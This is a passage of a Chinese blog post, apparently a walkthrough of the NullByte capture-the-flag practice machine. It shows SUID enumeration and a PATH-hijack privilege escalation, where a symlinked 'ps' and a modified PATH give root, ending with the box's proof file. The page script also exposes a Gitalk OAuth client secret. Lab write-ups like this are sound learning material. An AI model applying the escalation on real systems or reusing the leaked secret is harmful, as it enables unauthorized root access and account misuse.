&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:1c:0d:6f brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.108/24 brd 192.168.56.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe1c:d6f/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">ramses@NullByte:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for ramses: </span><br><span class="hljs-string">Sorry, user ramses may not run sudo on NullByte.</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看 s 权限的时候发现一个特殊文件，位于 backup 目录中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">ramses@NullByte:/home$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br>273365  552 -rwsr-xr-x   1 root     root       562536 Mar 23  2015 /usr/lib/openssh/ssh-keysign<br>274287   16 -rwsr-xr-x   1 root     root        13796 Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br>267213    8 -rwsr-xr-x   1 root     root         5372 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>261444   12 -rwsr-xr-x   1 root     root         9540 Apr 15  2015 /usr/lib/pt_chown<br>271482  356 -rwsr-xr--   1 root     messagebus   362672 May 28  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>273383   96 -rwsr-sr-x   1 root     mail        96192 Feb 12  2015 /usr/bin/procmail<br>272955   52 -rwsr-sr-x   1 daemon   daemon      50644 Sep 30  2014 /usr/bin/at<br>265920   52 -rwsr-xr-x   1 root     root        52344 Nov 20  2014 /usr/bin/chfn<br>263697   40 -rwsr-xr-x   1 root     root        38740 Nov 20  2014 /usr/bin/newgrp<br>265925   44 -rwsr-xr-x   1 root     root        43576 Nov 20  2014 /usr/bin/chsh<br>265924   80 -rwsr-xr-x   1 root     root        78072 Nov 20  2014 /usr/bin/gpasswd<br>274292   20 -rwsr-xr-x   1 root     root        18064 Nov 28  2014 /usr/bin/pkexec<br>265921   52 -rwsr-xr-x   1 root     root        53112 Nov 20  2014 /usr/bin/passwd<br>278443  176 -rwsr-xr-x   1 root     root       176400 Mar 12  2015 /usr/bin/sudo<br>273033 1056 -rwsr-xr-x   1 root     root      1081076 Feb 18  2015 /usr/sbin/exim4<br>391947    8 -rwsr-xr-x   1 root     root         4932 Aug  2  2015 /var/www/backup/procwatch<br>519235   40 -rwsr-xr-x   1 root     root        38868 Nov 20  2014 /bin/su<br>519210   36 -rwsr-xr-x   1 root     root        34684 Mar 30  2015 /bin/mount<br>519212   28 -rwsr-xr-x   1 root     root        26344 Mar 30  2015 /bin/umount<br>   149   96 -rwsr-xr-x   1 root     root        96760 Aug 13  2014 /sbin/mount.nfs<br><br></code></pre></td></tr></table></figure>
+
+<p>cat 去查看&#x2F;var&#x2F; www&#x2F;backup&#x2F;procwatch 文件，似乎是 gcc 编译后得到的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ramses@NullByte:/home$ <span class="hljs-built_in">ls</span> -liah /var/www/backup/procwatch<br>391947 -rwsr-xr-x 1 root root 4.9K Aug  2  2015 /var/www/backup/procwatch<br></code></pre></td></tr></table></figure>
+
+<p>运行一下试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ramses@NullByte:/var/www/backup$ /var/www/backup/procwatch<br>  PID TTY          TIME CMD<br> 1485 pts/0    00:00:00 procwatch<br> 1486 pts/0    00:00:00 sh<br> 1487 pts/0    00:00:00 ps<br></code></pre></td></tr></table></figure>
+
+<p>似乎是调用了 sh 和 ps，这里的提权方法需要记忆一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell">ramses@NullByte:/var/www/backup$ ln -s /bin/sh ps<br>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH<br>ramses@NullByte:/var/www/backup$ ./procwatch <br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">whoami</span></span><br>root<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /root</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>proof.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> pro</span>  <br>cat: pro: No such file or directory<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> proof.txt</span><br>adf11c7a9e6523e630aaf3b9b7acb51d<br><br>It seems that you have pwned the box, congrats. <br>Now you done that I wanna talk with you. Write a walk &amp; mail at<br>xly0n@sigaint.org attach the walk and proof.txt<br>If sigaint.org is down you may mail at nbsly0n@gmail.com<br><br><br>USE THIS PGP PUBLIC KEY<br><br>-----BEGIN PGP PUBLIC KEY BLOCK-----<br>Version: BCPG C# v1.6.1.0<br><br>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ<br>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT<br>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq<br>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK<br>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe<br>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu<br>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS<br>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q<br>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn<br>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58<br>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8<br>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU<br>Gms=<br>=PiAQ<br>-----END PGP PUBLIC KEY BLOCK-----<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Nullbyte靶机</div>
+      <div>https://i3eg1nner.github.io/2023/05/59d54dfe404f.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/05/98cd5798d7a5.html" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '225f30b6c01eb81b52443f08e49b66c7'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
